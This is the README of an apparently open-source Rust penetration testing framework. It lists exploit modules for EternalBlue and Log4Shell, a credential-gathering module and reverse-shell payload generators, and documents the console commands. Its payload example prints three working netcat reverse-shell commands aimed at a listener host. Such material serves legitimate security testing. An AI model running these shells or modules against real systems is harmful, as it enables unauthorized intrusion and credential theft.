# Amatsumara Framework

<p align="center">
  <img src="AmatsumaraLogo.png" alt="Amatsumara Logo" width="400"/>
</p>

<p align="center">
  <strong>A penetration testing framework built in Rust</strong>
</p>

<p align="center">
  Modules compile as native shared libraries and load dynamically at runtime.
</p>

---

## Overview

Amatsumara is a penetration testing framework built for performance and safety. Modules are `.so` shared libraries loaded via C FFI — add new capabilities by dropping a `.so` into the modules directory.

| | Count |
|---|---|
| Exploit Modules | 3 |
| Auxiliary Scanners | 16 |
| Post-Exploitation Modules | 2 |
| Payload Generators | 9 |

### Features

- **Dynamic Module Loading** — `.so` modules loaded at runtime, no framework recompile needed
- **Tab Completion** — commands, module names, options, subcommands
- **Session Management** — open, background, interact, kill sessions across targets
- **Background Jobs** — run listeners in the background with `-j`
- **Global Options** — `setg LHOST` once, applies everywhere
- **Numbered Search** — `search` results are numbered for quick `use 0` selection
- **Async Runtime** — built on Tokio

---

## Installation

**Requirements:** Rust 1.70+, Linux x86_64

```bash
git clone https://github.com/lorsupra/Amatsumara-Framework.git
cd Amatsumara-Framework
cargo build --release
./target/release/amatsumara-console
```

---

## Commands

### Module Selection

| Command | Description |
|---|---|
| `search <term>` | Search modules by name/description. Results are numbered. |
| `use <name\|number>` | Select a module by name or search result number. |
| `info [name\|number]` | Show module details. No argument = current module. |
| `back` | Deselect current module. |

### Options

| Command | Description |
|---|---|
| `set <OPT> <val>` / `forge <OPT> <val>` | Set a module option. |
| `unset <OPT>` | Clear a module option. |
| `setg <OPT> <val>` | Set a global option (persists across modules). |
| `unsetg <OPT>` | Clear a global option. |
| `options` | Show current module options. |

> Module options (`set`) override globals (`setg`), which override defaults.

### Execution

| Command | Description |
|---|---|
| `run` / `strike` | Execute the selected module. |
| `run -j` | Execute as a background job. |
| `check` | Run vulnerability check (if module supports it). |

### Sessions & Jobs

| Command | Description |
|---|---|
| `sessions -l` | List active sessions. |
| `sessions -i <id>` | Interact with a session. |
| `sessions -k <id\|all>` | Kill session(s). |
| `jobs` | List background jobs. |
| `kill <id>` | Kill a background job. |

Inside a session: `background` to return to console, `exit` to close.

### Display

| Command | Description |
|---|---|
| `show exploits\|auxiliary\|payloads\|post\|all` | List loaded modules by type. |
| `help` / `?` | Show help. |
| `banner` | Redisplay startup banner. |
| `exit` / `quit` | Exit framework. |

---

## Usage

### Exploit Workflow

```
amatsumara > search log4j

  #    Name                     Description
  -    ----                     -----------
  0    Apache Log4j RCE         Log4Shell JNDI injection (CVE-2021-44228)

amatsumara > use 0
amatsumara Apache Log4j RCE (exploit) > forge RHOST 192.168.1.100
RHOST => 192.168.1.100

amatsumara Apache Log4j RCE (exploit) > strike
[*] Launching module: Apache Log4j RCE
```

### Multi-Handler with Global Options

```
amatsumara > setg LHOST 10.0.0.5
amatsumara > setg LPORT 4444

amatsumara > use Multi Handler
amatsumara Multi Handler (exploit) > run -j
[*] Job 1 started in background

amatsumara > jobs
  Id    Name             Running
  --    ----             -------
  1     Multi Handler    12s
```

### Generating Payloads

```
amatsumara > use Unix Netcat Reverse TCP
amatsumara Unix Netcat Reverse TCP (payload) > forge LHOST 10.0.0.5
amatsumara Unix Netcat Reverse TCP (payload) > forge LPORT 9001
amatsumara Unix Netcat Reverse TCP (payload) > strike

[+] Netcat Reverse Shell Payload:
    Target: 10.0.0.5:9001

=== Option 1: Standard nc with mkfifo ===
mkfifo /tmp/ivnrm; nc 10.0.0.5 9001 0</tmp/ivnrm | /bin/sh >/tmp/ivnrm 2>&1; rm /tmp/ivnrm

=== Option 2: nc -e (traditional netcat) ===
nc -e /bin/sh 10.0.0.5 9001

=== Option 3: ncat (nmap netcat) ===
ncat 10.0.0.5 9001 -e /bin/sh
```

---

## Modules

### Exploits (3)

| Module | Description |
|---|---|
| `ms17_010` | EternalBlue — SMBv1 kernel RCE (CVE-2017-0144) |
| `apache_log4j_rce` | Log4Shell — JNDI injection RCE (CVE-2021-44228) |
| `multi_handler` | Generic listener for reverse shell payloads |

### Auxiliary Scanners (16)

FTP, HTTP directory, HTTP auth brute, IMAP, LDAP, Memcached, MySQL, POP3, port scan, Redis, SMB version, SMTP, SNMP, SSH, Telnet, VNC.

### Post-Exploitation (2)

| Module | Description |
|---|---|
| `linux_creds` | Gather credentials from common file locations |
| `linux_enum_system` | System enumeration (users, network, processes) |

### Payloads (9)

| Payload | Platform |
|---|---|
| Bash Reverse TCP | Linux/BSD |
| Netcat Reverse TCP | Linux/BSD |
| Perl Reverse TCP | Linux/BSD |
| Ruby Reverse TCP | Linux/BSD |
| Python Reverse TCP | Cross-platform |
| PHP Reverse TCP | Cross-platform |
| PowerShell Reverse TCP | Windows |
| Linux x64 Reverse TCP | Linux (binary) |
| Linux x64 Bind TCP | Linux (binary) |

---

## Architecture

```
Amatsumara-Framework/
├── amatsumara-api/        # C FFI types (ModuleVTable, ModuleInfo, etc.)
├── amatsumara-core/       # Module loader, session manager, discovery
├── amatsumara-console/    # Interactive REPL, tab completion
├── kanayago/              # Payload generation engine
├── modules/
│   ├── exploits/          # Exploit modules (.so + source)
│   ├── auxiliary/scanner/ # Scanner modules
│   ├── post/              # Post-exploitation modules
│   └── payloads/singles/  # Payload generators
├── pattern-create/        # Buffer overflow pattern generator
└── pattern-offset/        # Pattern offset finder
```

### Module Loading

1. Framework scans `modules/` recursively for `.so` files at startup
2. Loads each library, calls `amatsumara_module_init()` to get the VTable
3. Reads metadata via C FFI, indexes by name for search/selection
4. Drop a new `.so` into modules/ and restart — it's discovered automatically

### Sessions

Exploit modules open TCP connections and write session metadata to `/tmp/amatsumara_sessions/`. The console takes ownership of the stream. Sessions persist independently — background, interact later, or kill.

---

## Developing Modules

Each module is a standalone `cdylib` Rust crate exporting `amatsumara_module_init() -> *const ModuleVTable`.

```bash
mkdir -p modules/exploits/my_exploit/src
```

**Cargo.toml:**
```toml
[package]
name = "my_exploit"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
amatsumara-api = { path = "../../../amatsumara-api" }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
```

**src/lib.rs** — see any existing module for the pattern. Key points:

- Use `amatsumara_api::CString` (repr(C)), not `std::ffi::CString`
- Static metadata strings with `CString` wrappers pointing to `.as_ptr()`
- Options passed as JSON `*const c_char`, parsed with `serde_json`
- Return `0` for success, non-zero for failure

**Build & deploy:**
```bash
cd modules/exploits/my_exploit
cargo build --release
cp target/release/libmy_exploit.so .
rm -rf target/
```

---

## Utilities

```bash
# Generate cyclic pattern for buffer overflow dev
./target/release/pattern-create -l 500

# Find offset of a pattern value
./target/release/pattern-offset -q 41386141
```

---

## Changelog

**v2.0.0** — Removed non-functioning exploit modules. Quality over quantity. Starting fresh with 3 confirmed working exploits.

**v1.4.1** — Audit and bug fixes across 10 modules (port defaults, protocol formatting, nonce extraction, payload targeting).

**v1.3.0** — Full MS17-010 EternalBlue implementation with kernel shellcode and automatic session registration.

**v1.2.0** — 8 new exploit modules.

**v1.1.0** — 8 new HTTP-based exploit modules.

**v1.0.1** — HTTPS transport fix across 22 modules.

**v1.0.0** — Initial release. Dynamic module loading, interactive console, session management, background jobs, 9 payload generators, pattern utilities.

### Future

- Staged payloads (meterpreter-style agent)
- Resource scripts (batch command files)
- Database integration for target/loot tracking
- New exploit modules (added only after proper testing)

---

## Contributing

Areas of interest:

1. **Exploit Modules** — new vulnerability implementations
2. **Protocol Libraries** — SSH, SMB, RDP implementations
3. **Auxiliary Modules** — scanners, brute forcers, enumerators
4. **Payloads** — new types, staged payloads, encoders
5. **Testing** — validation against vulnerable targets

## License

BSD-3-Clause
